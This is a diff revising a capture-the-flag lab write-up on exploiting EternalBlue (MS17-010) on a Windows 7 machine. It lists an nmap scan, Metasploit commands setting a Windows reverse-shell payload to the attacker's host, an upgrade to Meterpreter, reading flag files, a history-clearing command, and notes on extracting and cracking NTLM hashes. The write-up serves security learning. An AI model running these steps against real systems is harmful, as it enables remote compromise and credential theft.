@@ -14,7 +14,7 @@
 ### Nmap
 **Command:**
 ```bash
-nmap -sVC -T4 -p- --open <ip>-oN blue.nmap
+nmap -sVC -T4 -p- --open <ip> -oN blue.nmap
 ```
 
 **Result Summary:**
@@ -66,7 +66,7 @@ Host script results:
 ## Service Analysis
 
 ### Port 445 - SMB
-- **What’s running:** Microsoft Windows RPC
+- **What’s running:** Microsoft SMB (Server Message Block)
 - **Interesting files/directories:** 
 - **Vulnerabilities identified:** ms17-010
 
@@ -81,28 +81,30 @@ Host script results:
 
 **Commands:**
 ```bash
-mfsconsole - to start MetaSploit
-	set the RHOST to <targetip>
-	set the LHOST to <hackermachine>
-	set payload windows/x64/shell/reverse_tcp - set the payload to get a reverse shell. 
-	show targets - to show potentional targets you can set which varies of the OS that the target has
-	set target 1 - to select target os
-	run - then run the exploit
+msfconsole - to start MetaSploit
+	set the RHOST to <target_ip>
+	set the LHOST to <your_ip>
+	set payload windows/x64/shell/reverse_tcp #set the payload to get a reverse shell. 
+	show targets  #to show potentional targets you can set which varies of the OS that the target has
+	set target 1  #to select target os
+	run #then run the exploit
+
+```
 ---
 
 ```bash
 CTRL+Z to background the shell
-Then ran "search shell_to_meterpreter" - to have a stable meterpreter session
+Then ran "search shell_to_meterpreter" #to have a stable meterpreter session
 use 0 - to choose the exploit
-sessions -l - to list the shells that we have.
+sessions -l #to list the shells that we have.
 set session 1
-run - This upgrades the session
+run #This upgrades the session
 ```
 The session will look like it dropped, if you see 'stopping exploit/multi/handlder' it did not crash, instead run the following.
 
 ```bash
 
-session 2 - this selects the upgraded session
+session 2 #this selects the upgraded session
 
 ```
 
@@ -134,26 +136,14 @@ search -f *.txt - search for all the flags
 ```
 
 ```bash
-
 cat "C:\\flag1.txt"
-
+cat "c:\\Windows\\System32\\config\\flag2.txt"
+cat "c:\\Users\\Jon\\Documents\\flag3.txt"
 ```
-
-```bash
-cat 'c:\Windows\System32\config\flag2.txt"
-```
-
-```bash
-cat 'c:\\Windows\\System32\\config\\flag2.txt\"
-```
-
-## Post Exploitation
 
 ### User Enumeration
-```bash
-id
-cat /etc/passwd
-```
+getuid
+ps
 
 ### File Discovery
 Flag 1 location: C:\flag1.txt
@@ -165,12 +155,7 @@ Flag 3 location: c:\Users\Jon\Documents\flag3.txt
 ## Privilege Escalation
 
 ### Method Used:
-- Kernel Exploit / Sudo Misconfig / Cronjob / etc
-
-**Commands:**
-```bash
-sudo -l
-```
+Not applicable — already NT AUTHORITY\SYSTEM from exploit
 
 ---
 
@@ -197,7 +182,6 @@ unset HISTFILE
 
 
 ## Summary/Understanding of what I've learned in this room
--
--
--
---------
+- Learned how to exploit the EternalBlue vulnerability (MS17-010) on a vulnerable Windows 7 machine using Metasploit.
+- Even though the exploit grants SYSTEM immediately, upgrading to Meterpreter makes post-exploitation easier.
+- Extracted NTLM hashes and used John the Ripper for cracking.
